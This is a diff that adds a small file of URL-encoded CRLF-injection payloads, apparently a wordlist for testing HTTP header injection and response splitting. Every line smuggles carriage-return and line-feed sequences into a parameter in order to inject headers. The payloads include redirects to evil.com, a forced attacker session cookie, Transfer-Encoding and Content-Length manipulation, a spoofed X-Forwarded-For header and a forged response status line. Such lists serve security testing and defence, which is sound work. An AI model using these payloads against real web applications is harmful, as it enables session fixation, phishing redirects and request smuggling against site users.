@@ -1,0 +1,8 @@
+%0d%0aLocation:%20http://evil.com
+%0d%0aSet-Cookie:%20sessionid=attacker
+foo%0d%0aContent-Length:%200
+%0d%0aX-Forwarded-For:%20127.0.0.1
+bar%0A%0DHTTP/1.1%20200%20OK
+param=value%0d%0aTransfer-Encoding:%20chunked
+q=%0d%0aRefresh:%205;url=http://evil.com
+p=%0d%0aContent-Disposition:%20attachment
